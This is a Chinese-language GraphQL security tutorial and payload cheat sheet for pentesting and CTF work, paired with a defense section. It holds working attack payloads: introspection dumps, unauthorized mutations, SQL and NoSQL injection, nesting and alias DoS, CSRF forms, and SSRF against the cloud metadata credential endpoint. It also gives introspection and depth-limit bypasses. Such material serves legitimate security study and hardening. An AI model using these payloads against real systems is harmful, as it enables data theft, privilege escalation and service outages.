# GraphQL 安全

## 一句话理解
GraphQL 把接口的"查询能力"交给了客户端，一旦内省开放、鉴权粒度跟不上，攻击者就能任意拼装查询，拖库、越权、绕过前端限制。

## 基础理解
### GraphQL vs REST

| 维度 | REST | GraphQL |
| --- | --- | --- |
| 端点 | 多个（/users、/orders...） | 通常单端点（/graphql），所有操作走同一入口 |
| 数据结构 | 服务端定义返回格式 | 客户端在 query 里**自己定义**要哪些字段 |
| 嵌套关联 | 多次请求手工拼装 | 单次请求多层嵌套（user → posts → comments） |
| 类型约束 | 无强约束 | Schema 强类型，接口自带"完整说明书" |

### 核心概念

| 概念 | 说明 |
| --- | --- |
| query | 查询（读操作） |
| mutation | 变更（写操作，增删改，等价 REST 的 POST/PUT/DELETE） |
| subscription | 订阅（服务端推送，走 WebSocket） |
| schema | 类型定义，描述所有可查询对象/字段/入参，是 GraphQL 的"地图" |
| resolver | 每个字段背后的处理函数——注入/越权/SSRF 缺陷几乎都在这里 |
| introspection | 内省：用 `__schema`/`__type` 元字段反查 schema 本身 |

### 常见端点
`/graphql`、`/graphiql`、`/api/graphql`、`/v1/graphql`、`/v1/api/graphql`、`/query`、`/gql`、`/altair`、`/api`、`/graphql/console`

## 常见成因
- 生产环境忘了关内省（开发时 GraphiQL 调试依赖它，配置直接带上了线）
- 前后端分离团队把"隐藏字段"的 ACL 只做在前端（不显示按钮 ≠ 服务端校验）
- resolver 拿用户输入直接拼 ORM/SQL/命令
- 网关无查询深度/复杂度限制，或限制器只统计了部分写法
- Content-Type 校验宽松（接受 form/text-plain），为 CSRF 打开大门

## 常见危害
- 拖库：schema 全量转储后按图索骥，把所有对象类型遍历一遍
- 越权读敏感字段（password/token/debug），越权调用高危 mutation（如 deleteUser）
- SQL/NoSQL 注入直达内网数据库
- 单请求 DoS：百层嵌套或千个别名把服务打挂

## 典型利用思路（常见攻击面）
### 1. 内省（Introspection）开启
最经典的第一步：一条查询拿走整个 schema：

```graphql
# 最简内省：列出所有类型及其字段
{__schema{types{name fields{name type{name}}}}}

# 完整内省（含 query/mutation/subscription 入口与入参）
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      fields {
        name
        args { name type { name kind ofType { name } } }
      }
    }
  }
}
```

- GraphiQL/Altair 调试台暴露（`/graphiql`、`/altair`）：等于把交互式客户端白送给攻击者，还能看历史查询
- 拿到 schema 后重点 grep：`password`、`token`、`secret`、`debug`、`admin`、`internal`

### 2. 信息泄露：隐藏字段直接查询
前端 UI 不展示的字段，schema 里往往还在。绕过前端 ACL：

```graphql
# 前端个人资料页只显示 id/name/email，但 schema 里还有这些：
{ user(id: 1) { id username password apiKey sessionToken debugInfo } }
```

### 3. 越权：mutation 越权调用
读要藏、写要防。高危 mutation 若无服务端权限校验：

```graphql
# 普通用户直接调用管理操作
mutation { deleteUser(id: 1) { success } }
mutation { updateRole(userId: 2, role: "admin") { id role } }
```

### 4. SQL / NoSQL 注入
GraphQL 层只是"传话筒"，resolver 拼接用户输入时照样注入：

```graphql
# SQL 注入：参数直进 ORM 字符串拼接
mutation { login(user: "admin' or 1=1--", pass: "x") { token } }

# NoSQL 注入（MongoDB 后端，注意要传原始 JSON 需走 variables）
# variables: {"id": {"$ne": null}}
query GetUser($id: String) { user(id: $id) { id username password } }
```

### 5. 批量查询 / 嵌套查询 DoS
两种打法，都不需要"很多请求"，单请求即可压垮服务：

```graphql
# 嵌套查询：自关联类型循环嵌套上百层，resolver 指数级放大
query {
  user(id: 1) {
    friends { friends { friends { friends {
      # ... 复制粘贴上百层
    } } } }
  }
}

# 别名批量（aliasing / batching）：一次请求发 1000 个查询，绕过"请求级"限流
query {
  a1: user(id: 1) { id email }
  a2: user(id: 2) { id email }
  # ... 中间省略
  a1000: user(id: 1000) { id email }
}
```

### 6. CSRF：GraphQL 的条件与防护
- `application/json` 的 POST 是**非简单请求**（触发 CORS 预检），纯 JSON 端点天然难被表单伪造
- 但端点若**同时接受** `application/x-www-form-urlencoded`、`multipart/form-data` 或 `text/plain`，这些是"简单请求"，攻击者可用隐藏表单跨站自动提交：
  `<form action="https://target.com/graphql" method="POST"><input name="query" value='mutation{changeEmail(...)}'></form>`
- 更危险：支持 GET 传 query 的端点，mutation 也能 GET 触发，`<img src="https://target.com/graphql?query=mutation{...}">` 一张图完成攻击
- 排测：把 Content-Type 依次换成 form/text-plain 看是否正常解析；试 `GET /graphql?query={__typename}`
- 防护：服务端严格限定 Content-Type 为 application/json、mutation 禁止 GET、重要操作加 CSRF token、Cookie 设 SameSite

### 7. 嵌套 resolver 的 SSRF / 文件操作
resolver 里"帮忙取 URL 内容"的逻辑是 SSRF 高发区：

```graphql
# avatarUrl 等字段被 resolver 拿去发起服务端请求
mutation {
  updateAvatar(url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/") {
    user { avatarContent }   # 若回显抓取内容，即 SSRF 读取成功
  }
}
```

内网探测同理：把 url 指向 `http://127.0.0.1:port/`，通过响应时间差/报错差异做端口扫描。

## 实战排查思路
1. **指纹识别**：POST 探测 + GET 探测双管齐下：

```http
POST /graphql HTTP/1.1
Content-Type: application/json

{"query":"{__typename}"}
```

```text
GET /graphql?query={__typename}
# 返回 {"data":{"__typename":"Query"}} 即确认是 GraphQL
```

2. **内省探测**：先跑最简内省（见攻击面第 1 节），成功则全量转储 schema
3. **工具链**：
   - [inql](https://github.com/doyensec/inql)（Burp 插件）：拦截 GraphQL 流量后自动执行内省，生成全部 query/mutation 模板，面板可视化点选发送；内省被禁时可配合字典盲猜
   - [graphw00f](https://github.com/dolevf/graphw00f)：服务端实现指纹（Apollo / GraphQL Yoga / Hasura / Strawberry / gqlgen...），不同实现的绕过姿势不同

```bash
# graphw00f 指纹识别
python graphw00f.py -t http://target.com -d
```

4. **字典**：内省被禁时盲猜字段名，常用：`user`、`users`、`admin`、`password`、`passwd`、`token`、`secret`、`apiKey`、`flag`、`debug`、`internal`、`id`、`email`、`role`
5. **mutation 枚举**：很多测试只盯着 query，忘了 mutation 才是"高危操作清单"：

```graphql
# 枚举所有 mutation 及其入参
{__schema{mutationType{fields{name args{name type{name}}}}}}
```

## 常见绕过思路
### 内省被禁时
- **字段名猜测 + 报错回显**：故意查错字段，利用 GraphQL 的 field suggestion（`Did you mean` 提示）逐字母逼近真实字段名：

```graphql
query { users { passwird } }
# 报错: Cannot query field "passwird" on type "User". Did you mean "password"?
# 每次报错都泄露一个"最接近的候选名"，逐字母盲猜可恢复整个 schema
# 自动化工具：Clairvoyance（基于 wordlist + 报错提示递归恢复 schema）
```

- **GET 方法绕过**：有的实现只对 POST 做内省拦截，换 `GET /graphql?query={__schema{types{name}}}` 试试
- **WAF 字符串绕过**：WAF 拦 `__schema` 字面量时，可用变量引用 + alias 或换行/注释改变报文形态（部分正则只匹配单行紧凑格式）
- **旁路信息源**：前端 JS bundle 里往往内嵌了完整 query 定义（搜索 `query`/`mutation`/`gql` 关键字），GraphiQL 历史记录、`/graphql.json` 等缓存文件

### 深度限制被绕过
- **fragment 绕过**：部分 depth-limit 实现统计时未展开 fragment，实际展开深度远超限制值：

```graphql
query { user(id: 1) { ...f1 } }
fragment f1 on User { friends { ...f2 } }
fragment f2 on User { friends { ...f3 } }
# fragment 链层层引用，展开后是 N 层嵌套，但限制器可能只数到 2 层
```

- **别名绕过**：别名批量不增加"深度"但成倍放大 resolver 执行量（见攻击面第 5 节），纯深度限制挡不住
- **变量/subscription 侧信道**：某些框架对 subscription 和 persisted query 的深度校验路径不同

## 综合案例：CTF 中的 GraphQL 拿 flag 流程
```text
1. 指纹确认：
   POST /graphql  body: {"query":"{__typename}"}
   返回 {"data":{"__typename":"Query"}} → 确认 GraphQL

2. 跑内省，dump 全部类型与字段：
   {__schema{types{name fields{name args{name}}}}}
   在返回 JSON 里 grep：flag / password / token / debug / admin

3. 发现敏感字段直接查（前端没展示但 schema 里有）：
   query { user(id: 1) { username flag } }
   → 成功读 flag，结束；若字段被 resolver 鉴权拦住，继续

4. 查 mutation 清单，找高危操作：
   {__schema{mutationType{fields{name args{name}}}}}
   发现 login(user, pass)，试注入：
   mutation { login(user: "admin' or 1=1--", pass: "x") { token } }

5. 内省若被禁：
   a) 换 GET：/graphql?query={__schema{types{name}}}
   b) 报错盲猜：query { flg } → "Did you mean 'flag'?"
   c) Burp + inql，或 Clairvoyance 字典自动恢复 schema

6. 若是 alias 批量 + IDOR 组合（分页限制 10 条/次）：
   query {
     u1: user(id:1){ email }
     u2: user(id:2){ email }
     # ... 单请求拖全表
   }
```

## 防御要点
- **生产禁用内省**：各框架开关（Apollo `introspection: false`、graphql-php `ValidationRules` 过滤）
- **深度限制**：[graphql-depth-limit](https://github.com/stems/graphql-depth-limit) 限制嵌套层级（注意覆盖 fragment 展开后的实际深度）
- **复杂度限制**：基于字段成本打分（[graphql-cost-analysis](https://github.com/pa-bru/graphql-cost-analysis)），比纯深度更准
- **字段级鉴权**：resolver 内做服务端 ACL，与业务层权限模型一致——"前端不显示"不算鉴权
- **禁用 GraphiQL/Altair**：调试台绝不带上线
- **Content-Type 白名单**：仅接受 `application/json`，mutation 禁止 GET，防 CSRF
- **操作级限流**：按"单请求内字段数/别名数"限流，而非仅按 HTTP 请求数
- **resolver 输入校验**：用户输入进 ORM 用参数化查询，URL 类字段做 SSRF 目标白名单

## 速查清单

| 场景 | Payload / 命令 |
| --- | --- |
| 确认端点 | `POST /graphql` body `{"query":"{__typename}"}`；`GET /graphql?query={__typename}` |
| 最简内省 | `{__schema{types{name fields{name type{name}}}}}` |
| 完整内省 | `query IntrospectionQuery { __schema { queryType{name} mutationType{name} types{name fields{name args{name type{name}}}}} }` |
| 枚举 mutation | `{__schema{mutationType{fields{name args{name}}}}}` |
| 隐藏字段 | `{ user(id:1){ password token debugInfo } }` |
| 注入点 | `mutation { login(user:"admin' or 1=1--", pass:"x"){ token } }` |
| 别名 DoS | `query { a1: user(id:1){...} a2: user(id:2){...} ... }` |
| 盲猜字段 | 查错名吃 `Did you mean` 提示，配 Clairvoyance 自动化 |
| 指纹工具 | `python graphw00f.py -t http://target.com -d` |
| Burp 插件 | inql：自动内省 + 生成全部查询模板 |

## 参考
- [PortSwigger - GraphQL API vulnerabilities](https://portswigger.net/web-security/graphql)
- [inql - GitHub](https://github.com/doyensec/inql)
- [graphw00f - GitHub](https://github.com/dolevf/graphw00f)
- [GraphQL 官方 - Security](https://graphql.org/learn/security/) / [Authorization](https://graphql.org/learn/authorization/)
- [PayloadsAllTheThings - GraphQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
- [Clairvoyance - schema 盲猜恢复工具](https://github.com/nikitastupin/clairvoyance)
